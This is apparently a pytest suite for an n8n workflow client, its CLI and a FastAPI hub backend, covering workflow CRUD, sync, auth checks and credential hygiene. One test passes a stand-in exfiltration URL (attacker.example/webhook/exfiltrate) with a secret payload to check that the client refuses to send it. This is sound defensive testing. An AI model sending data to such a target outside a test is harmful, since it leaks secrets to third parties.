"""Verification suite for Autonomous n8n API Client, CLI, and DarkHub integration.

Tests:
- N8nApiClient CRUD operations for workflows (list, get, create, update, activate, deactivate, delete).
- N8nApiClient webhook dispatching and execution telemetry.
- Synchronizer importing, validating, and updating sanitized workflow files.
- CLI subcommands (n8n-workflows, n8n-sync, n8n-trigger) with --json output.
- DarkHub API endpoints (/api/integrations/n8n/workflows, /sync, /trigger).
"""

from __future__ import annotations

import json
import os
import shutil
import tempfile
from pathlib import Path
from typing import Any, Dict, Optional
from unittest import mock

import pytest
from fastapi.testclient import TestClient

from core.integrations.n8n import (
    N8nApiClient,
    N8nApiResult,
    N8nConfig,
    N8nWorkflowManager,
)
from core.integrations.telegram_n8n_cli import build_parser
from hub.backend.api import get_hub_service
from hub.backend.main import app
from hub.backend.service import HubService

PROJECT_ROOT = Path(__file__).resolve().parents[1]


@pytest.fixture
def temp_project_dir():
    temp_dir = tempfile.mkdtemp(prefix="darkfac_n8n_test_")
    p = Path(temp_dir)
    wf_dir = p / ".factory" / "n8n" / "workflows"
    wf_dir.mkdir(parents=True, exist_ok=True)
    hub_data = p / "hub" / "data"
    hub_data.mkdir(parents=True, exist_ok=True)
    (hub_data / "default_services.json").write_text("[]", encoding="utf-8")
    (hub_data / "default_prompts.json").write_text("[]", encoding="utf-8")

    # Write a test workflow
    sample_wf = {
        "name": "Test Autonomous Workflow",
        "nodes": [
            {
                "name": "Start",
                "type": "n8n-nodes-base.start",
                "parameters": {"token": "secret_123"},
            }
        ],
        "connections": {},
    }
    (wf_dir / "sample_wf.json").write_text(json.dumps(sample_wf), encoding="utf-8")

    yield p
    shutil.rmtree(temp_dir, ignore_errors=True)


def test_n8n_api_client_list_and_get_workflows() -> None:
    calls = []

    def mock_http(method: str, url: str, headers: Dict[str, str], body: Optional[bytes], timeout: float) -> Dict[str, Any]:
        calls.append({"method": method, "url": url, "headers": headers})
        if "/api/v1/workflows/wf-1" in url:
            return {"success": True, "status_code": 200, "data": {"id": "wf-1", "name": "Deploy Agent"}}
        return {"success": True, "status_code": 200, "data": {"data": [{"id": "wf-1", "name": "Deploy Agent", "active": True}]}}

    cfg = N8nConfig(base_url="https://n8n.ggcampos.com", api_key="secret-key-123")
    client = N8nApiClient(config=cfg, http_client=mock_http)

    # 1. List workflows
    res = client.list_workflows(limit=10)
    assert res.success is True
    assert res.status_code == 200
    assert len(res.data["data"]) == 1
    assert calls[0]["headers"]["X-N8N-API-KEY"] == "secret-key-123"

    # 2. Get specific workflow
    res_get = client.get_workflow("wf-1")
    assert res_get.success is True
    assert res_get.data["id"] == "wf-1"


def test_n8n_api_client_create_and_update_workflow() -> None:
    created = []

    def mock_http(method: str, url: str, headers: Dict[str, str], body: Optional[bytes], timeout: float) -> Dict[str, Any]:
        payload = json.loads(body.decode("utf-8")) if body else {}
        created.append({"method": method, "url": url, "payload": payload})
        return {"success": True, "status_code": 200, "data": {"id": "new-wf-42", **payload}}

    cfg = N8nConfig(base_url="https://n8n.ggcampos.com", api_key="key-xyz")
    client = N8nApiClient(config=cfg, http_client=mock_http)

    res = client.create_workflow(
        name="Telegram Alert Gateway",
        nodes=[{"name": "Webhook", "type": "n8n-nodes-base.webhook"}],
        connections={},
        active=True,
    )
    assert res.success is True
    assert res.data["id"] == "new-wf-42"
    assert created[0]["method"] == "POST"
    assert created[0]["payload"]["name"] == "Telegram Alert Gateway"
    assert "active" not in created[0]["payload"]  # active is read-only in n8n API POST body
    assert any("/activate" in c["url"] for c in created)

    # Update workflow
    res_up = client.update_workflow("new-wf-42", {"name": "Updated Name", "nodes": []})
    assert res_up.success is True
    assert any(c["method"] == "PUT" for c in created)


def test_n8n_api_client_activation_and_webhook_trigger() -> None:
    events = []

    def mock_http(method: str, url: str, headers: Dict[str, str], body: Optional[bytes], timeout: float) -> Dict[str, Any]:
        events.append({"method": method, "url": url, "body": json.loads(body.decode("utf-8")) if body else None})
        if "/activate" in url:
            return {"success": True, "status_code": 200, "data": {"active": True}}
        if "/webhook/" in url:
            return {"success": True, "status_code": 200, "data": {"message": "received"}}
        return {"success": True, "status_code": 200}

    cfg = N8nConfig(base_url="https://n8n.ggcampos.com", webhook_url="https://n8n.ggcampos.com/webhook")
    client = N8nApiClient(config=cfg, http_client=mock_http)

    # Activate
    act_res = client.activate_workflow("wf-99")
    assert act_res.success is True
    assert "/activate" in events[0]["url"]

    # Trigger webhook
    trig_res = client.trigger_webhook("darkfac-alerts", {"event": "gate_passed", "ticket": "HF-14"})
    assert trig_res.success is True
    assert "webhook/darkfac-alerts" in events[1]["url"]
    assert events[1]["body"]["ticket"] == "HF-14"


def test_n8n_webhook_rejects_untrusted_origin_and_does_not_forward_key() -> None:
    calls = []

    def mock_http(method: str, url: str, headers: Dict[str, str], body: Optional[bytes], timeout: float) -> Dict[str, Any]:
        calls.append({"method": method, "url": url, "headers": headers})
        return {"success": True, "status_code": 200}

    cfg = N8nConfig(
        base_url="https://n8n.ggcampos.com",
        webhook_url="https://n8n.ggcampos.com/webhook",
        api_key="secret-key-123",
    )
    client = N8nApiClient(config=cfg, http_client=mock_http)

    result = client.trigger_webhook("https://attacker.example/webhook/exfiltrate", {"secret": "value"})

    assert result.success is False
    assert calls == []
    assert "secret-key-123" not in (result.error or "")


def test_n8n_http_errors_do_not_echo_credentials() -> None:
    api_key = "secret-key-123"

    def mock_http(method: str, url: str, headers: Dict[str, str], body: Optional[bytes], timeout: float) -> Dict[str, Any]:
        raise RuntimeError(f"remote failure included {api_key}")

    client = N8nApiClient(
        config=N8nConfig(base_url="https://n8n.ggcampos.com", api_key=api_key),
        http_client=mock_http,
    )
    result = client.list_workflows()

    assert result.success is False
    assert api_key not in (result.error or "")


def test_n8n_api_client_sync_workflows(temp_project_dir: Path) -> None:
    server_store = {"data": []}

    def mock_http(method: str, url: str, headers: Dict[str, str], body: Optional[bytes], timeout: float) -> Dict[str, Any]:
        if method == "GET" and "/api/v1/workflows" in url:
            return {"success": True, "status_code": 200, "data": server_store}
        if method == "POST" and "/api/v1/workflows" in url:
            data = json.loads(body.decode("utf-8"))
            data["id"] = "generated-id-1"
            server_store["data"].append(data)
            return {"success": True, "status_code": 200, "data": data}
        return {"success": True, "status_code": 200, "data": {}}

    cfg = N8nConfig(base_url="https://n8n.ggcampos.com", api_key="test-key")
    client = N8nApiClient(config=cfg, http_client=mock_http)

    wf_dir = temp_project_dir / ".factory" / "n8n" / "workflows"
    sync_results = client.sync_all_workflows(wf_dir, activate=True)

    assert "sample_wf.json" in sync_results
    assert sync_results["sample_wf.json"].success is True
    assert len(server_store["data"]) == 1
    assert server_store["data"][0]["name"] == "Test Autonomous Workflow"


def test_cli_headless_n8n_commands(temp_project_dir: Path) -> None:
    parser = build_parser()

    # Test n8n-workflows parser
    args_wfs = parser.parse_args(["--json", "n8n-workflows", "--url", "https://n8n.ggcampos.com", "--limit", "5"])
    assert args_wfs.subcommand == "n8n-workflows"
    assert args_wfs.url == "https://n8n.ggcampos.com"
    assert args_wfs.limit == 5

    # Test n8n-sync parser
    wf_file = str(temp_project_dir / ".factory" / "n8n" / "workflows" / "sample_wf.json")
    args_sync = parser.parse_args(["--json", "n8n-sync", "--path", wf_file])
    assert args_sync.subcommand == "n8n-sync"
    assert args_sync.path == wf_file

    # Test n8n-trigger parser
    args_trig = parser.parse_args(["--json", "n8n-trigger", "--path", "webhook/alert", "--payload", '{"test": 1}'])
    assert args_trig.subcommand == "n8n-trigger"
    assert args_trig.path == "webhook/alert"


def test_hub_backend_n8n_endpoints(temp_project_dir: Path) -> None:
    service = HubService(
        project_root=temp_project_dir,
        data_dir=temp_project_dir / "hub" / "data",
    )
    app.dependency_overrides[get_hub_service] = lambda: service
    client = TestClient(app)

    # 1. GET /api/integrations/n8n/workflows (with mock client)
    with mock.patch.object(
        N8nApiClient,
        "list_workflows",
        return_value=N8nApiResult(success=True, status_code=200, data={"data": [{"id": "w1", "name": "Sync"}]}),
    ):
        resp = client.get("/api/integrations/n8n/workflows?limit=10")
        assert resp.status_code == 200
        data = resp.json()
        assert data["success"] is True
        assert len(data["data"]["data"]) == 1

    # 2. POST /api/integrations/n8n/sync
    with mock.patch.object(
        N8nApiClient,
        "sync_all_workflows",
        return_value={"sample.json": N8nApiResult(success=True, status_code=200)},
    ):
        unauthenticated = client.post("/api/integrations/n8n/sync", json={"activate": True})
        assert unauthenticated.status_code == 401

        resp = client.post(
            "/api/integrations/n8n/sync",
            json={"activate": True},
            headers={"X-Hub-Session": service.session_token},
        )
        assert resp.status_code == 200
        data = resp.json()
        assert data["success"] is True
        assert "sample.json" in data["results"]

    # 3. POST /api/integrations/n8n/trigger
    with mock.patch.object(
        N8nApiClient,
        "trigger_webhook",
        return_value=N8nApiResult(success=True, status_code=200, data={"status": "dispatched"}),
    ) as trigger_webhook:
        unauthenticated = client.post(
            "/api/integrations/n8n/trigger",
            json={"path": "webhook/darkfac", "payload": {"status": "healthy"}},
        )
        assert unauthenticated.status_code == 401
        trigger_webhook.assert_not_called()

        resp = client.post(
            "/api/integrations/n8n/trigger",
            json={"path": "webhook/darkfac", "payload": {"status": "healthy"}},
            headers={"X-Hub-Session": service.session_token},
        )
        assert resp.status_code == 200
        data = resp.json()
        assert data["success"] is True
        assert data["data"]["status"] == "dispatched"


def test_hub_n8n_sync_rejects_path_outside_workflows(temp_project_dir: Path) -> None:
    service = HubService(
        project_root=temp_project_dir,
        data_dir=temp_project_dir / "hub" / "data",
    )
    outside = temp_project_dir / "outside.json"
    outside.write_text(json.dumps({"name": "outside", "nodes": []}), encoding="utf-8")

    with mock.patch.object(N8nApiClient, "sync_workflow_file") as sync_file:
        result = service.sync_n8n_workflows(custom_path=str(outside))

    assert result["success"] is False
    assert "inside the n8n workflows directory" in result["error"]
    sync_file.assert_not_called()
